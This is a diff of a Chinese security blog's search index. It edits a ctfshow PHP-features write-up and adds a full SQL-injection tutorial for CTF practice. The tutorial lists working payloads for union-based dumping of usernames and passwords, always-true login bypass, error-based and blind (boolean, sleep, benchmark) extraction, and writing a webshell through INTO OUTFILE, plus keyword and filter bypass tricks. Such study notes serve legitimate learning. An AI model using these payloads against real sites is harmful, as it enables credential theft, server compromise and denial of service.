@@ -4969,7 +4969,7 @@
   <entry>
     <title>web入门php篇-ctfshow</title>
     <url>/2024/11/10/web%E5%85%A5%E9%97%A8php%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/</url>
-    <content><![CDATA[<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><p>放一下主要的知识点</p>
+    <content><![CDATA[<h1 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h1><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><p>放一下主要的知识点</p>
 <h2 id="正则表达式元字符"><a href="#正则表达式元字符" class="headerlink" title="正则表达式元字符"></a>正则表达式元字符</h2><p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/759e3f5cd25ae3d504f0da96603268e6.png" alt="img"></p>
 <h2 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a>正则表达式修饰符</h2><ol>
 <li><strong><code>i</code> (case-insensitive)</strong>:<ul>
@@ -5012,13 +5012,17 @@
 <p>用于执行外部程序；<br>将命令的原始输出直接发送到标准输出设备（通常是浏览器）；<br>不返回任何值，但可以通过第二个参数捕获命令执行后的返回状态码。</p>
 <p>（3）exec()</p>
 <p>用于执行外部程序；<br>不会输出结果到标准输出，而是将最后一行结果作为返回值返回；<br>如果传入第二个参数（数组），可以将所有输出保存到这个数组中；<br>第三个参数是一个整数变量，用于捕获命令执行后的返回状态码。</p>
-<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>f(intval($num))–检查变量 <code>$num</code> 的整数值是否为真（即非零）</p>
 <p>if(preg_match(“&#x2F;[0-9]&#x2F;“, $num))–用于检查变量 <code>$num</code> 是否包含至少一个数字字符（0-9）</p>
 <h3 id="关于preg-match"><a href="#关于preg-match" class="headerlink" title="关于preg_match"></a>关于preg_match</h3><p>因为preg_match只能处理字符串，可以利用数组绕过，所以当传入的是数组时会返回false。</p>
+<h3 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h3><p><code>intval()</code> 函数是 PHP 中的一个内置函数，它用于获取变量的整数值。这个函数尝试将给定的变量转换为整数类型，并返回转换后的结果。</p>
+<p>函数原型</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br></pre></td></tr></table></figure>
+
 <h3 id="数组绕过intval函数"><a href="#数组绕过intval函数" class="headerlink" title="数组绕过intval函数"></a>数组绕过intval函数</h3><p> intval 转换数组类型时 不关心数组中的内容 只判断数组中有没有元素，而intval函数当传入的变量是非空数组的时候，会返回1</p>
 <p>payload:</p>
 <p>?num[]&#x3D;1</p>
@@ -8302,6 +8306,196 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web入门SQL注入篇-ctfshow</title>
+    <url>/2024/12/03/web%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5%E7%AF%87-ctfshow/</url>
+    <content><![CDATA[<h1 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h1><p>借鉴文章:<a href="https://fushuling.com/index.php/2023/04/07/sql%e6%b3%a8%e5%85%a5%e4%b8%80%e5%91%bd%e9%80%9a%e5%85%b3/">https://fushuling.com/index.php/2023/04/07/sql%e6%b3%a8%e5%85%a5%e4%b8%80%e5%91%bd%e9%80%9a%e5%85%b3/</a></p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p><strong>SQL注入：</strong>是发生于应用程序和数据库层的安全漏洞，简而言之，是在输入的字符串之中<strong>注入sql指令</strong>，在设计不良的程序当中<strong>忽略了字符检查</strong>，那么这些注入进去的恶意指令就会被数据库服务器<strong>误认为是正常的sql指令而运行</strong>，因此遭到破坏或是入侵。这种漏洞可能<strong>导致数据泄露、数据篡改、身份冒充和其他严重的安全问题</strong>。</p>
+<p>sql里有四大最常见的操作，即<strong>增删查改</strong>：</p>
+<ul>
+<li>增。增加数据。其简单结构为: <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</li>
+<li>删。删除数据。其简单结构为: <code>DELETE table_name WHERE condition</code>。</li>
+<li>查。查找数据。其简单结构为：<code>SELECT columns_name FROM table_name WHERE condition</code>。</li>
+<li>改。有修改&#x2F;更新数据。简单结构为:<code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</li>
+</ul>
+<h2 id="1-常规注入"><a href="#1-常规注入" class="headerlink" title="1.常规注入"></a>1.常规注入</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>联合注入即union注入，其作用就是，在原来查询条件的基础上，通过系统关键字<code>union</code>从而拼接上我们自己的<code>select</code>语句，然后把后面<code>select</code>得到的结果将拼接到前面<code>select</code>的结果后边。如：前个<code>select</code>得到2条数据，后个<code>select</code>也得到2条数据，那么后个<code>select</code>的数据将拼接到第一个<code>select</code>返回的内容中。</p>
+<p>联合注入有它的利用条件，UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条 SELECT 语句中的列的顺序必须相同，也就是说只能：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure>
+
+<p>这也是为什么我们在联合注入之前往往需要先利用 <code>order/group by n</code> 判断字段的数量。</p>
+<h2 id="联合查询注入步骤"><a href="#联合查询注入步骤" class="headerlink" title="联合查询注入步骤"></a>联合查询注入步骤</h2><p>假如对于url&#x2F;?id&#x3D;1，且后端代码用单引号包裹参数，我们的注入步骤为（其实即sqllib第一关，buuoj有在线环境）</p>
+<h3 id="MySQL-5-0"><a href="#MySQL-5-0" class="headerlink" title="MySQL &gt;&#x3D; 5.0"></a>MySQL &gt;&#x3D; 5.0</h3><p><strong>1) 确定字段的数量</strong></p>
+<p>通过从1开始改变n的大小，如果网页出现报错则证明n大于真实，因为order by n是对第n个字段进行排序的意思，如果n的值大于真实的字段数量自然就会报错了。至于最后的–+是注释符的意思，为了注释掉原有的sql语句执行我们自己的，也可以用%23即#代替：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by n --+</span><br></pre></td></tr></table></figure>
+
+<p>或者我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; group by n --+</span><br></pre></td></tr></table></figure>
+
+<p>group是对数据进行分组，也可以起到相同的效果。</p>
+<p><strong>2) 判断回显位</strong></p>
+<p>有时候页面里只有一个回显位，所以我们需要用-1保证前面的查询查不出数据以确保后面的联合查询能正常查询，假如我们确定了一共有三个字段，我们可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过数字是几判断回显位</p>
+<p><strong>3) 获取系统数据库名</strong></p>
+<p>group_concat()的作用是把回显放到一行里，便于观察</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>4) 获取当前数据库名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>5) 获取数据库中的表</strong></p>
+<p>获取当前数据的所有表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>即获取security数据库下的所有表名</p>
+<p><strong>6) 获取表里的列名(即字段名)</strong></p>
+<p>获得users表下的所有字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>7) 获取数据</strong></p>
+<p>如果我们想获得users表下username以及password的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username , password) from users --+</span><br></pre></td></tr></table></figure>
+
+<p>简单的说，<strong>查库名-&gt;查表名-&gt;查字段名-&gt;查数据</strong></p>
+<h3 id="MySQL-5-0-1"><a href="#MySQL-5-0-1" class="headerlink" title="MySQL &lt; 5.0"></a>MySQL &lt; 5.0</h3><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工爆破了，一般用于盲注，不过现在市面中基本上很多的数据库都是5.0以上的版本，暂时还没遇到过5.0以下的。</p>
+<p>说到联合注入我就想到联合注入的一个技巧，就是插入临时表，顺便再来谈谈sql万能密码</p>
+<h4 id="sql万能密码"><a href="#sql万能密码" class="headerlink" title="sql万能密码"></a>sql万能密码</h4><h5 id="永真语句"><a href="#永真语句" class="headerlink" title="永真语句"></a>永真语句</h5><p>‘ or 1&#x3D;’1 </p>
+<p>‘or’&#x3D;’or’</p>
+<p>通过一个永真判断登录，其中，1&#x3D;1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。这导致无论用户名是什么，只要密码是万能密码，用户都能通过验证。</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>分号<code>;</code>为MYSQL语句的结束符，若在支持多语句执行的情况下，可利用此方法执行其他恶意语句。比如有函数mysqli_multi_query()，它支持执行一个或多个针对数据库的查询，查询语句使用分号隔开。如果正常的语句是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1;</span><br></pre></td></tr></table></figure>
+
+<p>若支持堆叠注入，我们就可以在后面添加自己的语句执行命令，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1;;show tables%23</span><br></pre></td></tr></table></figure>
+
+<p>但通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面，可考虑使用<code>RENAME</code>关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名 </p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>通过<strong>特殊函数</strong>的错误使用使其参数被页面输出，有点像SSTI。当然，这种注入可以成功的前提是服务器开启报错信息返回，也就是发生错误时返回报错信息，常见的利用函数有常见的利用函数有：<code>exp()、floor()+rand()、**updatexml()**、**extractvalue()**</code></p>
+<h4 id="利用updatexml-进行报错注入"><a href="#利用updatexml-进行报错注入" class="headerlink" title="利用updatexml()进行报错注入"></a>利用updatexml()进行报错注入</h4><p><strong>Updatexml()函数:</strong></p>
+<ul>
+<li>主要用于更新XML类型的数据。</li>
+<li>适用于需要修改XML数据中的节点值或插入新节点的场景。</li>
+<li>在数据库维护和数据更新方面有着广泛的应用。</li>
+</ul>
+<p><strong>函数原型：updatexml(‘XML_document’,’Xpath_string’,’New_value’)</strong></p>
+<p><strong>解释：updatexml(‘目标xml文件名’,’在xml中查询的字符串’,’替换后的值’)</strong></p>
+<p><strong>查询数据库：id&#x3D;1’ and (select updatexml(1,concat(0x7e,(database()),0x7e),1))#</strong></p>
+<p><strong>查询表名:id&#x3D;1’ and (select updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema&#x3D;database() limit x,1),0x7e),1))#</strong></p>
+<p><strong>查询列&#x2F;字段名:id&#x3D;1’ and (select updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit x,1),0x7e),1))#</strong></p>
+<p><strong>查询数据：id&#x3D;1’ and (select updatexml(1,concat(0x7e,(SELECT  group_concat(user,0x3a,avatar) from users limit 0,1),0x7e),1))#</strong></p>
+<p><strong>Limit x,1中x为任意值</strong></p>
+<h4 id="利用extractvalue-进行报错注入"><a href="#利用extractvalue-进行报错注入" class="headerlink" title="利用extractvalue()进行报错注入"></a>利用extractvalue()进行报错注入</h4><p><strong>Extractvalue()函数：</strong></p>
+<ul>
+<li>主要用于从XML数据中查询并返回包含指定XPath字符串的字符串。</li>
+<li>适用于从XML数据中提取特定信息的场景。</li>
+<li>在数据查询和数据解析方面发挥着重要作用。</li>
+</ul>
+<p>函数原型：extractvalue(xml_document,Xpath_string)</p>
+<p>正常语法：extractvalue(xml_document,Xpath_string);</p>
+<p>第一个参数：xml_document是string格式，为xml文档对象的名称</p>
+<p>第二个参数：Xpath_string是xpath格式的字符串</p>
+<p>作用：从目标xml中返回包含所查询值的字符串</p>
+<p><strong>id&#x3D;’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</strong></p>
+<p>查数据库名：id&#x3D;’and (select extractvalue(1,concat(0x7e,database())))#</p>
+<p><strong>在爆表、列、值的时候用group_concat函数把查询结果分组聚合，然后用and xxxxx not in ‘xxx’,’xxx’过滤掉前面回显的</strong></p>
+<p><strong>爆表名：</strong>id&#x3D;’and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))#</p>
+<p>**爆字段名:**id&#x3D;’and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_table&#x3D;”table_name”))))#</p>
+<p><strong>爆数据：</strong>id&#x3D;’and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from database().table_name))))#</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>利用<strong>逻辑代数连接词&#x2F;条件函数</strong>，让页面<strong>返回的内容&#x2F;响应时间</strong>与正常的页面不符，然后通过字符一位一位匹配所需要的名称</p>
+<p>常见的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length(str) ：返回字符串str的长度</span><br><span class="line">substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len) ：跟上面的一样，截取字符串</span><br><span class="line">ascii(str) ：返回字符串str的最左面字符的ASCII代码值</span><br><span class="line">ord(str) ：将字符或布尔类型转成ascll码</span><br><span class="line">if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure>
+
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>进行布尔盲注的条件是页面会有回显作为语句执行是否成功的标志，一般我们可以先用永真条件<code>or 1=1</code>与永假条件<code>and 1=2</code>的返回内容是否存在差异进行判断是否可以进行布尔盲注</p>
+<p><strong>什么情况下考虑使用布尔盲注？*</strong>*</p>
+<ol>
+<li>该输入框存在注入点。</li>
+<li>该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。</li>
+</ol>
+<p>​	3. 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。</p>
+<p><strong>函数替换：1、如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样</strong></p>
+<p>​	<strong>left（str，index）从左边第index开始截取</strong></p>
+<p>​	<strong>right(str，index)从右边第index开始截取</strong></p>
+<p>​	<strong>substring（str，index）从左边index开始截取</strong></p>
+<p>​	<strong>mid（str，index，len）截取str从index开始，截取len的长度</strong></p>
+<p>​	<strong>lpad（str，len，padstr）</strong></p>
+<p>​	<strong>rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果</strong></p>
+<p><strong>手工注入：</strong></p>
+<p><strong>1. 判断是否存在注入以及注入类型</strong></p>
+<p><strong>2. 构造sql语句，利用length()函数得到数据库长度：</strong>1 and(length(database()))&gt;x根据回显是否正常来判断数据库长度</p>
+<p><strong>3. 猜测数据库名字，利用ascii()函数和substr()函数依次得到数据库的名字，例如：</strong>1 and (ascii(substr(database(),y,1)))&gt;x，根据每个字母的ascii值找出数据库的第y个字母</p>
+<p>**4. 判断表的数量,例如:**1 and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;x来判断表的数量</p>
+<p>**5. 猜测表名:**1 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit x,1),y,1))&gt;x 来猜测第x张表的第y个字母</p>
+<p>**6. 猜测字段数量:**1 and (select count(column_name) from information_schema.columns where table_name&#x3D;’表名’)&#x3D;1</p>
+<p>**7. 猜测数据内容:**1 and ascii(substr((select * from 数据库.表名 where id&#x3D;1),1,1))&gt;x</p>
+<p><strong>手工盲注特别繁琐，碰到这类题目要会用工具sqlmap</strong></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 </p>
+<p>​	时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。</p>
+<p><strong>什么情况下考虑使用时间盲注？*</strong>*</p>
+<p>​	1. 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样</p>
+<p>​	2. 不会回显注入语句执行结果，故无法使用UNION注入</p>
+<p>​	3. 不会显示报错信息，故无法使用报错注入</p>
+<p>​	4. 符合盲注的特征，但不属于布尔型盲注</p>
+<p><strong>常用函数</strong></p>
+<p>​	<strong>sleep(n)：将程序挂起一段时间, n为n秒。</strong></p>
+<p>​	<strong>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。</strong></p>
+<p>​	<strong>使用sleep()函数和if()函数：<code>and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) #</code>   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。</strong></p>
+<p><strong>手工注入:</strong></p>
+<p><strong>1. 利用sleep()函数和if()函数判断数据库长度：</strong>1 and if(length(database())&#x3D;x,sleep(y),1)–页面y秒后才回应，说明数据库名称长度为x</p>
+<p>**2. 猜测数据库名称:例如:**1 and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1) adcii(s)&#x3D;115</p>
+<p>**3. 猜测表中数:**1 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;x,sleep(y),1) 页面y秒后反应，说明有x张表</p>
+<p>**4. 猜测表:**1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;110,sleep(3),1)  ascii(n)&#x3D;110</p>
+<p>**5. 猜测字段数:**1 and if((select count(column_name) from information_schema.columns where table_name&#x3D;’flag’)&#x3D;1,sleep(3),1)  3秒后响应，只有一个字段</p>
+<p>**6. 猜测字段名:**1 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’表名’),1,1))&#x3D;102,sleep(3),1) </p>
+<h5 id="时间盲注sleep被ban怎么办"><a href="#时间盲注sleep被ban怎么办" class="headerlink" title="时间盲注sleep被ban怎么办"></a>时间盲注sleep被ban怎么办</h5><p>benchmark()函数的作用是重复执行某表达式，如benchmark(10000000,md5(‘yu22x’));<br>会计算10000000次md5(‘yu22x’)，因为次数很多所以就会产生延时，但这种方法对服务器会对产生很大的负荷，容易把服务器跑崩，如果崩掉的话就把time.sleep的值改大点，除了md5还可以使用其他函数，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));</span><br><span class="line">benchmark(1e7,sha1(&#x27;kradress&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><strong>手工盲注特别繁琐，碰到这类题目要会用工具sqlmap</strong></p>
+<h3 id="sql注入getshell"><a href="#sql注入getshell" class="headerlink" title="sql注入getshell"></a>sql注入getshell</h3><p><strong>前提：</strong></p>
+<ul>
+<li>存在SQL注入漏洞</li>
+<li>web目录具有写入权限</li>
+<li>找到网站的绝对路径</li>
+<li>secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）</li>
+<li>getshell是指攻击者通过利用SQL注入获取系统权限的方法，Webshell提权分两种：一是利用<strong>outfile函数</strong>，另外一种是利用**–os-shell**；UDF提权通过堆叠注入实现；MOF提权通过”条件竞争”实现</li>
+</ul>
+<p>union select写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.55.130/work/sqli-1.php?id=@ union select 1,2,3,4,&#x27;&lt;?php phpinfo() ?&gt;&#x27; into outfile &#x27;C:/wamp64/www/work/WebShell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>lines terminated by 写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.55.130/work/sqli-1.php?id=1 into outfile &#x27;C:/wamp64/www/work/Webshell.php&#x27; lines terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;;</span><br><span class="line">原理：通过select语句查询的内容写入文件，也就是 1 into outfile &#x27;C:/wamp64/www/work/webshell.php&#x27; 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。</span><br></pre></td></tr></table></figure>
+
+<p>lines starting by 写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.55.130/work/sqli-1.php?id=1 into outfile &#x27;C:/wamp64/www/work/webshell.php&#x27; lines starting by &#x27;&lt;?php phpinfo() ?&gt;&#x27;;</span><br><span class="line">#原理：利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。</span><br></pre></td></tr></table></figure>
+
+<p>fields terminated by 写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.55.130/work/sqli-1.php?id=1 into outfile &#x27;C:/wamp64/www/work/webshell.php&#x27; fields terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;;</span><br><span class="line">#利用 fields terminated by 语句拼接webshell的内容。fields terminated by可以理解为以每个字段的位置添加 xx 内容。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-bypass技巧"><a href="#2-bypass技巧" class="headerlink" title="2.bypass技巧"></a>2.bypass技巧</h2><h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><h4 id="大小写绕过，双写绕过"><a href="#大小写绕过，双写绕过" class="headerlink" title="大小写绕过，双写绕过"></a>大小写绕过，双写绕过</h4><h4 id="注释符-关键字绕过"><a href="#注释符-关键字绕过" class="headerlink" title="注释符(关键字绕过)"></a>注释符(关键字绕过)</h4><p>比如用<code>unio&lt;&gt;n</code>代替union，用<code>se/**/lect</code>代替select</p>
+<h4 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h4><p>我们可以用”||”1、” or “1”&#x3D;”1，甚至是”union select 1,2,”3进行闭合</p>
+<h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h4><p>编码绕过:%20 %09 %0a %0b %0c %0d %a0 %00</p>
+<p>内联注释:&#x2F;**&#x2F; &#x2F;<em>字符串</em>&#x2F;</p>
+<p>括号绕过:即添加括号代替空格，比如我们的正常语句为<code>SELECT 用户名 FROM </code>sheet1&#96;&#96;，现在我们就可以改成<code>SELECT(用户名)FROM(</code>sheet1<code>)</code></p>
+<h4 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h4><p>转为16进制字符串，这样就不用使用引号</p>
+<h4 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h4><h5 id="from-to"><a href="#from-to" class="headerlink" title="from to"></a>from to</h5><p>盲注的时候为了截取字符串，我们往往会使用substr(),mid()。这些子句方法都需要使用到逗号，对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+<p>等价于mid&#x2F;substr(database(),1,1)</p>
+<h5 id="使用join"><a href="#使用join" class="headerlink" title="使用join"></a>使用join</h5><p>select 1,2等价于select * from (select 1)a join (select 2)b</p>
+<h5 id="使用like"><a href="#使用like" class="headerlink" title="使用like"></a>使用like</h5><p>select ascii(mid(user(),1,1))&#x3D;114等价于select user() like ‘r%’，即逐个字符串比较，我们可以暴力破解%前的字符串，直到爆破出select user() like ‘root@localhost’，得到真正的用户名</p>
+<h5 id="使用offset"><a href="#使用offset" class="headerlink" title="使用offset"></a>使用offset</h5><p>盲注的时候除了substr()和mid()需要使用逗号，limit也会使用逗号，比如语句<code>select * from sheet1 limit 0,1 </code>,这时我们可以使用<code>select * from sheet1 limit 1 offset 0</code> 等效替代</p>
+<h4 id="绕过or-and-xor-not"><a href="#绕过or-and-xor-not" class="headerlink" title="绕过or and xor not"></a>绕过or and xor not</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;</span><br><span class="line">or=|| </span><br><span class="line">xor=^</span><br><span class="line">not=!</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
 </search>
